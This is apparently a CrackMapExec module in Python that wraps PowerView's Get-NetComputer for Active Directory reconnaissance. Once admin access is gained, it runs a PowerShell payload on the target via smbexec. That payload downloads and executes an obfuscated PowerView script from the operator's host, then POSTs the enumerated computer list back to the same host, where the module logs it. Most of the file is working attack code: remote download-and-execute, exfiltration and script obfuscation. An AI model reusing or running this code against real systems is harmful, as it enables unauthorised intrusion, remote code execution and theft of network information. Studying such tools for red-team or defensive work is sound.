from core.helpers import create_ps_command, obfs_ps_script
from StringIO import StringIO
from datetime import datetime

class CMEModule:
    '''
        Wrapper for PowerView's Get-NetGroup function
        Module by @byt3bl33d3r
    '''

    name = 'GetComputers'

    def options(self, context, module_options):
        '''
            COMPUTERNAME  Return computers with a specific name, wildcards accepted (default: all computers)
            SPN           Return computers with a specific service principal name, wildcards accepted (default: None)
            DOMAIN        The domain to query for computers (default: current domain) 
        '''

        self.computername = None
        self.domain = None
        self.spn = None
        if 'COMPUTERNAME' in module_options:
            self.computername = module_options['COMPUTERNAME']

        if 'DOMAIN' in module_options:
            self.domain = module_options['DOMAIN']

        if 'SPN' in module_options:
            self.spn = module_options['SPN']


    def on_admin_login(self, context, connection):

        powah_command = 'Get-NetComputer'

        if self.computername:
            powah_command += ' -ComputerName "{}"'.format(self.computername)

        if self.domain:
            powah_command += ' -Domain {}'.format(self.domain)

        if self.spn:
            powah_command += ' -SPN {}'.format(self.spn)

        powah_command += ' | Out-String'

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/PowerView.ps1');
        $data = {command}
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server, 
                                          port=context.server_port, 
                                          addr=context.localip,
                                          command=powah_command)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload, method='smbexec')
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'PowerView.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open('data/PowerSploit/Recon/PowerView.ps1', 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read())
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data) > 0:
            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)

        log_name = 'Computers-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
        with open('logs/' + log_name, 'w') as log_file:
            log_file.write(data)
        context.log.info("Saved output to {}".format(log_name))